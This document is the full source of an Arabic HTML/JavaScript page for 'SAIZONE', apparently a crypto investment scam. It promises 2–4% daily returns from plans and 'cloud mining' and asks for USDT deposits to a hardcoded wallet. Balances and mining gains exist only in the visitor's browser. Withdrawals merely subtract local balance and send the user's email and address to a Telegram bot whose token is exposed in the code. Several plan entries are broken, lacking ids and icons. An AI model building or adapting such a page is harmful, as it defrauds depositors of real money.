<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>SAIZONE | ICON UPDATE</title>
    
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

    <style>
        :root { 
            --bg: #050505; --card: #111111; --text: #ffffff; --subtext: #9ca3af; 
            --accent: #3b82f6; --border: #1f1f1f; --nav: rgba(10, 10, 10, 0.98);
        }
        body.light-mode {
            --bg: #f3f4f6; --card: #ffffff; --text: #111827; --subtext: #4b5563;
            --border: #e5e7eb; --nav: rgba(255, 255, 255, 0.98);
        }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: 'Cairo', sans-serif; transition: background 0.3s, color 0.3s; }
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; background: var(--bg); color: var(--text); overflow: hidden; }
        .page { display: none; height: 100dvh; padding: 20px; overflow-y: auto; padding-bottom: 120px; }
        .page.active { display: block; animation: fadeIn 0.3s; }
        .card { background: var(--card); border-radius: 24px; padding: 20px; margin-bottom: 20px; border: 1px solid var(--border); }
        nav { position: fixed; bottom: 0; width: 100%; background: var(--nav); backdrop-filter: blur(15px); display: none; justify-content: space-around; padding: 15px 0; border-top: 1px solid var(--border); z-index: 5000; }
        .nav-item { color: var(--subtext); font-size: 10px; text-align: center; flex: 1; cursor: pointer; }
        .nav-item.active { color: var(--accent); font-weight: 900; }
        .theme-toggle { position: absolute; top: 20px; left: 20px; width: 40px; height: 40px; background: var(--card); border: 1px solid var(--border); border-radius: 12px; display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 6000; }
        #botBtn { position: fixed; bottom: 100px; right: 20px; width: 55px; height: 55px; background: #0088cc; border-radius: 50%; display: none; align-items: center; justify-content: center; z-index: 6000; box-shadow: 0 4px 20px rgba(0, 136, 204, 0.6); border: 2px solid white; }
        .input-style { width: 100%; background: rgba(120, 120, 120, 0.1); border: 1px solid var(--border); border-radius: 15px; padding: 12px; color: var(--text); outline: none; margin-bottom: 15px; text-align: center; font-size: 13px; }
        
        /* تنسيق أيقونات الباقات */
        .plan-icon-box { width: 75px; height: 75px; border-radius: 18px; margin-bottom: 12px; display: flex; align-items: center; justify-content: center; border: 2px solid var(--border); background: var(--bg); }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="dark-mode">

    <div id="toast" style="position: fixed; top: 30px; left: 50%; transform: translateX(-50%); background: #fff; color: #000; padding: 8px 20px; border-radius: 50px; z-index: 100000; display: none; font-weight: 900; font-size: 10px;"></div>
    <div id="themeToggle" class="theme-toggle" onclick="toggleTheme()" style="display: none;"><i id="themeIcon" class="fa-solid fa-moon text-blue-500"></i></div>
    <a href="https://t.me/Hassan20005pp_bot" id="botBtn" target="_blank"><i class="fa-solid fa-robot text-white text-xl"></i></a>

    <div id="authPage" style="position: fixed; inset: 0; background: #050505; display: flex; align-items: center; justify-content: center; z-index: 10000;">
        <div style="width: 85%; text-align: center;">
            <h2 class="text-4xl font-black mb-10 text-white italic">SAIZONE</h2>
            <input type="email" id="email" placeholder="البريد الإلكتروني" class="input-style bg-zinc-900 border-zinc-800">
            <input type="password" id="password" placeholder="كلمة المرور" class="input-style bg-zinc-900 border-zinc-800">
            <button onclick="handleLogin()" class="w-full bg-white text-black py-4 rounded-full font-black mt-4">تسجيل الدخول</button>
        </div>
    </div>

    <div id="mainApp" style="display: none;">
        <div id="profilePage" class="page active">
            <div class="card text-center border-b-4 border-blue-600">
                <p class="text-[10px] text-blue-500 font-bold uppercase">Main Wallet</p>
                <h2 id="userNameDisplay" class="font-black text-2xl uppercase mt-1">---</h2>
                <p id="userIdDisplay" class="text-[11px] text-gray-400 font-mono italic">UID: 20260000</p>
            </div>
            <div class="card">
                <div class="flex justify-between items-center">
                    <div><p class="text-[11px] text-gray-400 font-bold">الرصيد الكلي</p><h3 class="text-4xl font-black text-blue-500">$<span id="pBalance">0.00</span></h3></div>
                    <span id="currentPlan" class="text-[10px] font-bold text-white bg-blue-600 px-4 py-1 rounded-full">No Plan</span>
                </div>
                <div style="background: rgba(59, 130, 246, 0.05); border: 1px solid var(--accent); border-radius: 18px; padding: 14px; display: flex; align-items: center; justify-content: space-between; margin-top: 15px;">
                    <div class="flex flex-col overflow-hidden">
                        <span class="text-[8px] text-blue-400 uppercase font-bold mb-1">Invite Link</span>
                        <span id="refLinkDisplay" class="text-[10px] font-mono truncate max-w-[180px]">---</span>
                    </div>
                    <button onclick="copyRefLink()" class="bg-blue-600 text-white text-[9px] px-4 py-2 rounded-xl font-black">COPY</button>
                </div>
                <div id="adminContainer" style="display:none;" class="mt-4 p-4 border border-dashed border-red-500 rounded-2xl bg-red-500/5">
                    <button onclick="openAdminPanel()" class="w-full text-red-500 font-black text-xs uppercase italic">إضافة رصيد (Admin Only)</button>
                </div>
            </div>
            <button onclick="logout()" class="w-full mt-4 py-3 text-red-500 text-[10px] font-bold uppercase border border-red-500/20 rounded-xl">تسجيل الخروج</button>
        </div>

        <div id="plansPage" class="page">
            <h3 class="text-center text-[12px] text-gray-500 mb-6 font-black uppercase tracking-widest">Investment Plans</h3>
            <div id="plansList" class="grid grid-cols-1 gap-4"></div>
        </div>

        <div id="depositPage" class="page">
            <div class="card text-center">
                <h3 class="font-black text-blue-500 mb-6 text-sm">شحن المحفظة (USDT TRC20)</h3>
                <div class="bg-zinc-800/50 p-4 rounded-2xl text-[10px] text-blue-400 border border-blue-500/20 mb-6 font-mono break-all">TTmVnVwGtMm11BkxJA7LYitCgfTqoSN8dw</div>
                <input type="number" id="depAmount" placeholder="المبلغ المرسل ($)" class="input-style">
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-4 rounded-xl font-bold text-white">تأكيد عملية الإيداع</button>
            </div>
        </div>

        <div id="withdrawPage" class="page">
            <div class="card text-center">
                <h3 class="font-black text-gray-400 mb-6 text-sm">سحب الأرباح</h3>
                <input type="text" id="witAddress" placeholder="عنوان المحفظة USDT TRC20" class="input-style">
                <input type="number" id="witAmount" placeholder="المبلغ المطلوب سحبه ($)" class="input-style">
                <button onclick="submitWithdraw()" class="w-full bg-blue-600 py-4 rounded-xl font-bold text-white">إرسال طلب السحب</button>
            </div>
        </div>

        <div id="miningPage" class="page"><div class="card text-center py-20 mt-10"><i class="fa-solid fa-bolt text-4xl text-blue-500 mb-4"></i><h3 class="font-black">Cloud Mining</h3><button onclick="doMining()" class="bg-blue-600 text-white w-44 mx-auto block py-3 rounded-full text-[10px] mt-8 font-black">ابدأ التعدين</button></div></div>

        <nav id="bottomNav">
            <div class="nav-item active" onclick="tabNav(this, 'profilePage')"><i class="fa-solid fa-user mb-1 text-lg"></i><br>Profile</div>
            <div class="nav-item" onclick="tabNav(this, 'plansPage')"><i class="fa-solid fa-gem mb-1 text-lg"></i><br>Plans</div>
            <div class="nav-item" onclick="tabNav(this, 'miningPage')"><i class="fa-solid fa-bolt mb-1 text-lg"></i><br>Mine</div>
            <div class="nav-item" onclick="tabNav(this, 'depositPage')"><i class="fa-solid fa-plus-circle mb-1 text-lg"></i><br>Deposit</div>
            <div class="nav-item" onclick="tabNav(this, 'withdrawPage')"><i class="fa-solid fa-wallet mb-1 text-lg"></i><br>Payout</div>
        </nav>
    </div>

    <script>
        const TG_TOKEN = "8548855381:AAE0ENEyVbRHAq-w75gIqHK1TmKV6A1pSXo"; 
        const TG_CHAT_ID = "8575658586"; 
        const MASTER_ADMIN = "abwk18468@gmail.com";
        let userData = JSON.parse(localStorage.getItem('saizone_user'));
        const dynamicRefCode = Math.random().toString(36).substring(2, 8).toUpperCase();

        const plans = [
            { id: 1, n: "Bronze Core", p: 10, d: 0.20, icon: "fa-solid fa-seedling", color: "text-orange-700" },
            { id: 2, n: "Iron Shield", p: 50, d: 1.25, icon: "fa-solid fa-shield-alt", color: "text-gray-500" },
            { id: 3, n: "Steel Will", p: 100, d: 2.70, icon: "fa-solid fa-dumbbell", color: "text-gray-300" },
            { id: 4, n: "Silver Spark", p: 250, d: 7.25, icon: "fa-solid fa-bolt", color: "text-zinc-400" },
            { id: 5, n: "Gold Rush", p: 500, d: 15.50, icon: "fa-solid fa-coins", color: "text-yellow-500" },
            { n: "Platinum Edge", p: 1000, d: 33.00, i: "https://image_gen.g.aicloud/Platinum_Edge.png" },
            { n: "Emerald Star", p: 2500, d: 87.50, i: "https://image_gen.g.aicloud/Emerald_Star.png" },
            { n: "Sapphire Sky", p: 5000, d: 185.00, i: "https://image_gen.g.aicloud/Sapphire_Sky.png" },
            { n: "Diamond Peak", p: 10000, d: 390.00, i: "https://image_gen.g.aicloud/Diamond_Peak.png" },
            { n: "Pink Matrix", p: 50000, d: 2100.00, i: "https://image_gen.g.aicloud/Pink_Matrix.png" }
        ];

        async function sendAdminNotification(msg) {
            const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`;
            try { await fetch(url); } catch (e) {}
        }

        function handleLogin() {
            const e = document.getElementById('email').value.trim().toLowerCase();
            const p = document.getElementById('password').value;
            if(!e || !p) return showToast("يرجى ملء البيانات");
            if(!userData) {
                const fixedId = Math.floor(20260000 + Math.random() * 99999);
                userData = { email: e, name: e.split('@')[0], balance: 0, daily: 0, plan: "No Plan", planId: 0, lastMine: "", id: fixedId };
            }
            document.getElementById('authPage').style.display = 'none';
            document.getElementById('mainApp').style.display = 'block';
            document.getElementById('bottomNav').style.display = 'flex';
            document.getElementById('botBtn').style.display = 'flex';
            document.getElementById('themeToggle').style.display = 'flex';
            if(e === MASTER_ADMIN) document.getElementById('adminContainer').style.display = 'block';
            save();
        }

        function buyPlan(id, n, p, d) {
            if(userData.planId >= id) return showToast("لا يمكنك الترقية لخطة اقل او مساوية");
            
            let currentPlanPrice = 0;
            if(userData.planId > 0) {
                const currentPlanObj = plans.find(pl => pl.id === userData.planId);
                if(currentPlanObj) currentPlanPrice = currentPlanObj.p;
            }
            const upgradeCost = p - currentPlanPrice;

            if(userData.balance < upgradeCost) return showToast(`تحتاج لـ $${upgradeCost.toFixed(2)} للترقية`);
            
            userData.balance -= upgradeCost;
            userData.daily = d;
            userData.plan = n;
            userData.planId = id;
            save();
            showToast(`تم الترقية لـ ${n} ✅`);
            initPlans();
        }

        function initPlans() {
            const list = document.getElementById('plansList');
            list.innerHTML = "";
            plans.forEach(pl => {
                const isCurrent = userData.planId === pl.id;
                const isLocked = userData.planId > pl.id;
                
                let currentPlanPrice = 0;
                if(userData.planId > 0) {
                    const currentPlanObj = plans.find(pObj => pObj.id === userData.planId);
                    if(currentPlanObj) currentPlanPrice = currentPlanObj.p;
                }
                const displayPrice = pl.p - currentPlanPrice;

                // إنشاء الباقة باستخدام الأيقونات المتاحة
                list.innerHTML += `
                <div class="card p-4 border border-zinc-800 flex flex-col items-center text-center ${isLocked ? 'opacity-50' : ''}">
                    <div class="plan-icon-box">
                        <i class="${pl.icon} ${pl.color} text-4xl"></i>
                    </div>
                    
                    <h4 class="text-blue-500 font-black">${pl.n}</h4>
                    <p class="text-[10px] text-zinc-500 mt-1">
                        ${isLocked || isCurrent ? `السعر الأصلي: $${pl.p}` : `تكلفة الترقية: $${displayPrice.toFixed(2)}`} 
                        <br> ربح يومي $${pl.d}
                    </p>
                    <button onclick="buyPlan(${pl.id}, '${pl.n}', ${pl.p}, ${pl.d})" 
                        class="${isCurrent ? 'bg-green-600' : (isLocked ? 'bg-zinc-700' : 'bg-blue-600')} text-white mt-4 py-2 w-32 rounded-full font-bold text-[9px]"
                        ${isLocked || isCurrent ? 'disabled' : ''}>
                        ${isCurrent ? 'خيارك الحالي' : (isLocked ? 'خطة سابقة' : 'ترقية الآن')}
                    </button>
                </div>`;
            });
        }

        // --- باقي الوظائف الأصلية دون تغيير ---
        async function submitDeposit() {
            const amt = document.getElementById('depAmount').value;
            if(!amt || amt <= 0) return showToast("أدخل مبلغاً صحيحاً");
            await sendAdminNotification(`🔔 إيداع جديد: ${userData.email}\n💰 المبلغ: $${amt}\n🆔 UID: ${userData.id}`);
            showToast("تم إرسال الطلب ✅");
            document.getElementById('depAmount').value = "";
        }
        async function submitWithdraw() {
            const addr = document.getElementById('witAddress').value;
            const amt = parseFloat(document.getElementById('witAmount').value);
            if(!addr || !amt || amt < 5) return showToast("تأكد من البيانات");
            if(amt > userData.balance) return showToast("رصيدك غير كافٍ");
            await sendAdminNotification(`⚠️ سحب جديد: ${userData.email}\n💰 المبلغ: $${amt}\n🏦 العنوان: ${addr}`);
            userData.balance -= amt; save(); showToast("طلب السحب قيد المعالجة ✅");
        }
        function save() { localStorage.setItem('saizone_user', JSON.stringify(userData)); updateUI(); }
        function updateUI() {
            if(!userData) return;
            document.getElementById('pBalance').innerText = userData.balance.toFixed(2);
            document.getElementById('userNameDisplay').innerText = userData.name;
            document.getElementById('userIdDisplay').innerText = "UID: " + userData.id;
            document.getElementById('currentPlan').innerText = userData.plan;
            document.getElementById('refLinkDisplay').innerText = window.location.origin + "/?ref=" + dynamicRefCode;
        }
        function toggleTheme() {
            document.body.classList.toggle('light-mode');
            const i = document.getElementById('themeIcon');
            i.className = document.body.classList.contains('light-mode') ? "fa-solid fa-sun text-yellow-500" : "fa-solid fa-moon text-blue-500";
        }
        function copyRefLink() { navigator.clipboard.writeText(document.getElementById('refLinkDisplay').innerText); showToast("تم نسخ الرابط ✅"); }
        function logout() { localStorage.clear(); location.reload(); }
        function tabNav(el, p) {
            document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById(p).classList.add('active'); el.classList.add('active');
        }
        function doMining() {
            if(userData.planId === 0) return showToast("اشترك في خطة أولاً");
            const today = new Date().toDateString();
            if(userData.lastMine === today) return showToast("تم التعدين اليوم");
            userData.balance += userData.daily; userData.lastMine = today; save(); showToast("تم التعدين بنجاح! ✅");
        }
        function openAdminPanel() {
            const targetId = prompt("أدخل UID المستخدم:");
            if (targetId == userData.id) {
                const amount = parseFloat(prompt("المبلغ ($):"));
                if (amount > 0) { userData.balance += amount; save(); showToast(`تم شحن $${amount} ✅`); initPlans(); }
            }
        }
        function showToast(m) { const t = document.getElementById('toast'); t.innerText = m; t.style.display = 'block'; setTimeout(()=>t.style.display='none', 3000); }
        initPlans(); window.onload = () => { if(userData) handleLogin(); };
    </script>
</body>
</html>
